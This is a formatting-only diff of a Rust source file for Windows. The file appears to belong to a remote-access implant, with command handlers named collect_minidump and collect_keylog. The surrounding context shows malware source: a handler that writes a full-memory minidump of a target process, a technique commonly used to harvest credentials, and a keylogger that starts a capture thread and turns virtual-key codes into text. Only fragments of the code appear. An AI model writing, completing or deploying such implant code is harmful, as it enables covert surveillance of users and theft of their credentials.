@@ -11,9 +11,7 @@ use std::sync::OnceLock;
 
 use base64::Engine;
 use windows_sys::Win32::Foundation::{CloseHandle, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE};
-use windows_sys::Win32::Storage::FileSystem::{
-    CreateFileW, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
-};
+use windows_sys::Win32::Storage::FileSystem::{CreateFileW, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL};
 use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows_sys::Win32::System::Diagnostics::ToolHelp::{
     CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
@@ -139,7 +137,10 @@ pub fn collect_minidump(arguments: &str) -> HandlerOutput {
         ) -> i32;
         let dump: DumpFn = std::mem::transmute(dump_proc);
         let file = CreateFileW(
-            path.encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>().as_ptr(),
+            path.encode_utf16()
+                .chain(std::iter::once(0))
+                .collect::<Vec<u16>>()
+                .as_ptr(),
             GENERIC_WRITE,
             0,
             std::ptr::null(),
@@ -167,7 +168,9 @@ pub fn collect_minidump(arguments: &str) -> HandlerOutput {
             return fail("collect.minidump: MiniDumpWriteDump failed");
         }
         let size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
-        ok(&format!("{path}: {size} bytes (pid {pid}, full-memory minidump)"))
+        ok(&format!(
+            "{path}: {size} bytes (pid {pid}, full-memory minidump)"
+        ))
     }
 }
 
@@ -231,7 +234,10 @@ static KEYLOG: OnceLock<std::sync::Mutex<KeylogState>> = OnceLock::new();
 /// buffer, stop ends the thread.
 pub fn collect_keylog(arguments: &str) -> HandlerOutput {
     let keylog = KEYLOG.get_or_init(|| {
-        std::sync::Mutex::new(KeylogState { running: false, buffer: String::new() })
+        std::sync::Mutex::new(KeylogState {
+            running: false,
+            buffer: String::new(),
+        })
     });
     match arguments.trim() {
         "start" => {
@@ -304,17 +310,19 @@ fn key_text(key: u8, shift: bool) -> Option<String> {
         0x0D => Some("\n".into()),
         0x1B => Some("[esc]".into()),
         0x20 => Some(" ".into()),
-        0x21..=0x28 => Some(match key {
-            0x21 => "[pgup]",
-            0x22 => "[pgdn]",
-            0x23 => "[end]",
-            0x24 => "[home]",
-            0x25 => "[left]",
-            0x26 => "[up]",
-            0x27 => "[right]",
-            _ => "[down]",
-        }
-        .into()),
+        0x21..=0x28 => Some(
+            match key {
+                0x21 => "[pgup]",
+                0x22 => "[pgdn]",
+                0x23 => "[end]",
+                0x24 => "[home]",
+                0x25 => "[left]",
+                0x26 => "[up]",
+                0x27 => "[right]",
+                _ => "[down]",
+            }
+            .into(),
+        ),
         0x30..=0x39 => {
             let digit = key - 0x30;
             Some(if shift {
@@ -325,7 +333,14 @@ fn key_text(key: u8, shift: bool) -> Option<String> {
         }
         0x41..=0x5A => {
             let letter = (b'a' + (key - 0x41)) as char;
-            Some(if shift { letter.to_ascii_uppercase() } else { letter }.to_string())
+            Some(
+                if shift {
+                    letter.to_ascii_uppercase()
+                } else {
+                    letter
+                }
+                .to_string(),
+            )
         }
         0xBA => Some(if shift { ":" } else { ";" }.into()),
         0xBB => Some(if shift { "+" } else { "=" }.into()),
@@ -339,9 +354,17 @@ fn key_text(key: u8, shift: bool) -> Option<String> {
 }
 
 fn ok(output: &str) -> HandlerOutput {
-    HandlerOutput { outcome: Outcome::Succeeded, output: output.into(), chunks: Vec::new() }
+    HandlerOutput {
+        outcome: Outcome::Succeeded,
+        output: output.into(),
+        chunks: Vec::new(),
+    }
 }
 
 fn fail(output: &str) -> HandlerOutput {
-    HandlerOutput { outcome: Outcome::Failed, output: output.into(), chunks: Vec::new() }
+    HandlerOutput {
+        outcome: Outcome::Failed,
+        output: output.into(),
+        chunks: Vec::new(),
+    }
 }
